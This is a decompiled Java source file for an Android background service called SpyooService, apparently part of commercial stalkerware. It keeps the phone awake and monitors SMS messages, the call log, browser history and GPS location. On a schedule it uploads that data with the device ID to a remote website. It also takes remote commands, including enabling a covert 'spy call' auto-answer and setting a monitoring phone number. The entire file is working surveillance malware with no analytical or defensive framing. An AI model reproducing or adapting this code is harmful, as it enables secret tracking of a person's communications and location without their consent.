package iits.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Browser;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import iits.code.bus.Account_BUS;
import iits.code.bus.Setting_BUS;
import iits.code.dto.Account_DTO;
import iits.code.dto.Setting_DTO;
import iits.common.Constants;
import iits.mamager.CallManager;
import iits.mamager.FileManager;
import iits.mamager.GPSManager;
import iits.mamager.LoginManager;
import iits.mamager.SMSManager;
import iits.mamager.SettingManager;
import iits.mamager.URLManager;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.HttpResponse;

public class SpyooService extends Service {
    private static final String TAG = "SpyooService";
    private Account_DTO account;
    ContentObserver callContentObserver;
    private String deviceID;
    private String link;
    private LocationManager lm;
    private GPSListener locationListener;
    private Context mContext;
    private long period;
    private PowerManager pm;
    private Setting_DTO setting;
    ContentObserver smsContentObserver;
    private TimerTask task = new TimerTask() {
        /* class iits.service.SpyooService.AnonymousClass1 */

        public void run() {
            try {
                FileManager.WriteLog(1, SpyooService.TAG, "begin task");
                FileManager.WriteLog(1, SpyooService.TAG, "check account");
                if (SpyooService.this.account.getUsername().equals("") || SpyooService.this.account.getPassword().equals("")) {
                    SpyooService.this.account = Account_BUS.get(SpyooService.this.mContext);
                    if (SpyooService.this.account.getUsername().equals("") || SpyooService.this.account.getPassword().equals("")) {
                        return;
                    }
                }
                HttpResponse response = LoginManager.login(SpyooService.this.mContext, String.valueOf(SpyooService.this.link) + Constants.URL_LOGIN, "", "", "");
                FileManager.WriteLog(1, SpyooService.TAG, "check internet");
                if (response != null) {
                    FileManager.WriteLog(1, SpyooService.TAG, "send gps");
                    GPSManager.sendDataOfGPSToWebsite(SpyooService.this.mContext, String.valueOf(SpyooService.this.link) + Constants.URL_GPS, SpyooService.this.deviceID);
                    FileManager.WriteLog(1, SpyooService.TAG, "send sms");
                    SMSManager.sendDataOfSMSToWebsite(SpyooService.this.mContext, String.valueOf(SpyooService.this.link) + Constants.URL_SMS, SpyooService.this.deviceID);
                    FileManager.WriteLog(1, SpyooService.TAG, "send call");
                    CallManager.sendDataOfCallToWebsite(SpyooService.this.mContext, String.valueOf(SpyooService.this.link) + Constants.URL_CALL, SpyooService.this.deviceID);
                    FileManager.WriteLog(1, SpyooService.TAG, "send url");
                    URLManager.sendDataOfURLToWebsite(SpyooService.this.mContext, String.valueOf(SpyooService.this.link) + Constants.URL_URL, SpyooService.this.deviceID);
                    SpyooService.this.SetOrGetSetting();
                }
            } catch (Exception e) {
                FileManager.WriteLog(3, SpyooService.TAG, "Error on run function: " + e.toString());
            }
        }
    };
    private Timer timer;
    ContentObserver urlContentObserver;
    private PowerManager.WakeLock wl;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        init();
    }

    public void onDestroy() {
        super.onDestroy();
        destroy();
    }

    public void init() {
        try {
            this.pm = (PowerManager) getSystemService("power");
            this.wl = this.pm.newWakeLock(1, "My Tag");
            this.wl.acquire();
            FileManager.WriteLog(1, TAG, "init service");
            this.mContext = getApplicationContext();
            this.setting = Setting_BUS.get(this.mContext);
            this.account = Account_BUS.get(this.mContext);
            restartListeners();
            this.deviceID = ((TelephonyManager) getSystemService("phone")).getDeviceId();
            this.link = this.setting.getLink();
            this.timer = new Timer();
            long deplay = (long) (this.setting.getReportTime() * 60 * 1000);
            this.period = deplay;
            this.timer.schedule(this.task, deplay, this.period);
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on init function: " + e.toString());
            stopSelf();
        }
    }

    public void SetOrGetSetting() {
        try {
            if (this.setting.getSendSetting()) {
                FileManager.WriteLog(1, TAG, "send setting to website");
                SettingManager.setSettingToWebsite(this.mContext, String.valueOf(this.setting.getLink()) + Constants.URL_SETSETTING, this.deviceID, this.setting);
                this.setting.setSendSetting(false);
                return;
            }
            String result = SettingManager.getSettingFromWebsite(this.mContext, String.valueOf(this.setting.getLink()) + Constants.URL_GETSETTING, this.deviceID);
            FileManager.WriteLog(1, TAG, "get setting from website");
            FileManager.WriteLog(1, TAG, result);
            boolean flagRestartSevice = false;
            if (!result.equals("")) {
                flagRestartSevice = UpdateSetting(result);
            }
            if (!flagRestartSevice) {
                return;
            }
            if (((long) (this.setting.getReportTime() * 60 * 1000)) != this.period) {
                stopSelf();
                startService(new Intent(this, ResetService.class));
                return;
            }
            restartListeners();
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on SetOrGetSetting function: " + e.toString());
        }
    }

    public boolean UpdateSetting(String strSetting) {
        try {
            String[] arrSetting = strSetting.split(",");
            for (String item : arrSetting) {
                if (!item.equals("")) {
                    String[] arrItem = item.split(">");
                    String key = String.valueOf(arrItem[0]) + ">";
                    if (key.equals(Constants.SETTING_ACTIVATE)) {
                        this.setting.setRunMode(true);
                    } else if (key.equals(Constants.SETTING_DEACTIVATE)) {
                        this.setting.setRunMode(false);
                    } else if (key.equals(Constants.SETTING_AUTO_ANSWER_OFF)) {
                        this.setting.setFlagSpyCall(false);
                    } else if (key.equals(Constants.SETTING_AUTO_ANSWER_ON)) {
                        this.setting.setFlagSpyCall(true);
                    } else if (key.equals(Constants.SETTING_DISTANCE_FILTER)) {
                        if (arrItem.length != 3) {
                            return false;
                        }
                        this.setting.setHorizontal(Integer.valueOf(arrItem[1].substring(1, arrItem[1].length())).intValue());
                        this.setting.setVertical(Integer.valueOf(arrItem[2].substring(1, arrItem[2].length())).intValue());
                    } else if (key.equals(Constants.SETTING_GPS_INTERVAL)) {
                        if (arrItem.length != 2) {
                            return false;
                        }
                        this.setting.setGPSInterval(Integer.valueOf(arrItem[1].substring(1, arrItem[1].length())).intValue());
                    } else if (key.equals(Constants.SETTING_HISTORY_CALL_OFF)) {
                        this.setting.setFlagCall(false);
                    } else if (key.equals(Constants.SETTING_HISTORY_CALL_ON)) {
                        this.setting.setFlagCall(true);
                    } else if (key.equals(Constants.SETTING_HISTORY_CONTACT_OFF)) {
                        this.setting.setFlagContact(false);
                    } else if (key.equals(Constants.SETTING_HISTORY_CONTACT_ON)) {
                        this.setting.setFlagContact(true);
                    } else if (key.equals(Constants.SETTING_HISTORY_GPS_OFF)) {
                        this.setting.setFlagGPS(false);
                    } else if (key.equals(Constants.SETTING_HISTORY_GPS_ON)) {
                        this.setting.setFlagGPS(true);
                    } else if (key.equals(Constants.SETTING_HISTORY_SMS_OFF)) {
                        this.setting.setFlagSMS(false);
                    } else if (key.equals(Constants.SETTING_HISTORY_SMS_ON)) {
                        this.setting.setFlagSMS(true);
                    } else if (key.equals(Constants.SETTING_HISTORY_URL_OFF)) {
                        this.setting.setFlagURL(false);
                    } else if (key.equals(Constants.SETTING_HISTORY_URL_ON)) {
                        this.setting.setFlagURL(true);
                    } else if (key.equals(Constants.SETTING_REPORT_INTERVAL)) {
                        if (arrItem.length != 2) {
                            return false;
                        }
                        this.setting.setReportTime(Integer.valueOf(arrItem[1].substring(1, arrItem[1].length())).intValue());
                    } else if (key.equals(Constants.SETTING_SECRET_KEY)) {
                        if (arrItem.length != 2) {
                            return false;
                        }
                        this.setting.setSecretKey(arrItem[1].substring(1, arrItem[1].length()));
                    } else if (!key.equals(Constants.SETTING_MONITORING_PHONE)) {
                        continue;
                    } else if (arrItem.length != 2) {
                        return false;
                    } else {
                        this.setting.setSpyCallNumber(arrItem[1].substring(1, arrItem[1].length()));
                    }
                }
            }
            Setting_BUS.update(this.mContext, this.setting);
            return true;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on UpdateSetting function: " + e.toString());
            return false;
        }
    }

    public void restartListeners() {
        try {
            if (!this.setting.getFlagGPS() || !this.setting.getRunMode()) {
                stopGPS();
            } else {
                startGPS();
            }
            if (!this.setting.getFlagCall() || !this.setting.getRunMode()) {
                stopCall();
            } else {
                startCall();
            }
            if (!this.setting.getFlagSMS() || !this.setting.getRunMode()) {
                stopSMS();
            } else {
                startSMS();
            }
            if (!this.setting.getFlagURL() || !this.setting.getRunMode()) {
                stopURL();
            } else {
                startURL();
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on restartServices function: " + e.toString());
        }
    }

    public void startGPS() {
        try {
            long minTime = (long) (this.setting.getGPSInterval() * 60 * 1000);
            if (this.lm == null) {
                this.lm = (LocationManager) getSystemService("location");
                this.locationListener = new GPSListener(this.mContext, minTime, this.setting.getVertical(), this.setting.getHorizontal());
            } else {
                this.locationListener.setMinTime(minTime);
                this.locationListener.setVertical(this.setting.getVertical());
                this.locationListener.setHorizontal(this.setting.getHorizontal());
            }
            this.lm.requestLocationUpdates("gps", minTime, 0.0f, this.locationListener);
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on startGPS function: " + e.toString());
        }
    }

    public void stopGPS() {
        try {
            if (this.locationListener != null) {
                this.lm.removeUpdates(this.locationListener);
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on stopGPS function: " + e.toString());
        }
    }

    public void startSMS() {
        try {
            if (this.smsContentObserver == null) {
                this.smsContentObserver = new SMSListener(new Handler(), getContentResolver(), this.mContext);
            }
            getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, this.smsContentObserver);
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on startSMS function: " + e.toString());
        }
    }

    public void stopSMS() {
        try {
            if (this.smsContentObserver != null) {
                getContentResolver().unregisterContentObserver(this.smsContentObserver);
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on stopSMS function: " + e.toString());
        }
    }

    public void startCall() {
        try {
            if (this.callContentObserver == null) {
                this.callContentObserver = new CallListener(new Handler(), getContentResolver(), this.mContext);
            }
            getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, this.callContentObserver);
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on startCall function: " + e.toString());
        }
    }

    public void stopCall() {
        try {
            if (this.callContentObserver != null) {
                getContentResolver().unregisterContentObserver(this.callContentObserver);
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on stopCall function: " + e.toString());
        }
    }

    public void startURL() {
        try {
            if (this.urlContentObserver == null) {
                this.urlContentObserver = new URLListener(new Handler(), getContentResolver(), this.mContext);
            }
            getContentResolver().registerContentObserver(Browser.BOOKMARKS_URI, true, this.urlContentObserver);
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on startURL function: " + e.toString());
        }
    }

    public void stopURL() {
        try {
            if (this.urlContentObserver != null) {
                getContentResolver().unregisterContentObserver(this.urlContentObserver);
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on stopURL function: " + e.toString());
        }
    }

    public void destroy() {
        if (this.timer != null) {
            this.timer.cancel();
        }
        stopGPS();
        stopCall();
        stopSMS();
        stopURL();
        this.wl.release();
    }
}
